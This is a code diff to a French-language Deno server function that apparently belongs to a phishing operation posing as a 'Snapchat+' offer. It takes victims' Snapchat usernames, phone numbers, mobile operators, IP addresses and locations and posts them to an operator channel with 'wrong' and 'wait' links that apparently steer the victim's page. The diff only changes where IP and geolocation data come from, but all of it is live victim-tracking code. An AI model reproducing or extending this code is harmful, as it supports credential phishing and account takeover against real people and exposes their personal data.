@@ -12,15 +12,20 @@ Deno.serve(async (req) => {
 
   const base44 = createClientFromRequest(req);
   const body = await req.json();
-  const { snapchat, telephone, operateur, submissionId } = body;
+  const { snapchat, telephone, operateur, submissionId, ip, country, city } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
-  const ip = req.headers.get("x-real-ip") ||
-             req.headers.get("x-forwarded-for")?.split(",").pop()?.trim() ||
-             req.headers.get("cf-connecting-ip") ||
-             "Inconnue";
+  // Use IP from body if provided (from createSubmission), otherwise extract from headers
+  let finalIp = ip || req.headers.get("x-real-ip") ||
+                req.headers.get("x-forwarded-for")?.split(",").pop()?.trim() ||
+                req.headers.get("cf-connecting-ip") ||
+                "Inconnue";
+  
+  let finalCountry = country || "France";
+  let finalCity = city || "Inconnue";
+
   const userAgent = req.headers.get("user-agent") || "";
   
   let browser = "Inconnu";
@@ -49,15 +54,6 @@ Deno.serve(async (req) => {
   const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
 
-  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
-  let geoData = { country_name: "France", city: "Inconnue" };
-  if (geoResponse?.ok) {
-    geoData = await geoResponse.json();
-  }
-
-  const country = geoData.country_name || "France";
-  const city = geoData.city || "Inconnue";
-
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
     color: operatorColors[operateur] || 16776960,
@@ -65,11 +61,11 @@ Deno.serve(async (req) => {
       { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
-      { name: "🌍 Pays", value: country, inline: true },
-      { name: "🏙️ Ville", value: city, inline: true },
+      { name: "🌍 Pays", value: finalCountry, inline: true },
+      { name: "🏙️ Ville", value: finalCity, inline: true },
       { name: "🌐 Navigateur", value: browser, inline: true },
       { name: "💾 Appareil", value: device, inline: true },
-      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
+      { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
@@ -90,7 +86,7 @@ Deno.serve(async (req) => {
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
     action: "submitted",
-    details: { browser, device, ip, country, city },
+    details: { browser, device, ip: finalIp, country: finalCountry, city: finalCity },
     timestamp: now.toISOString()
   });
 
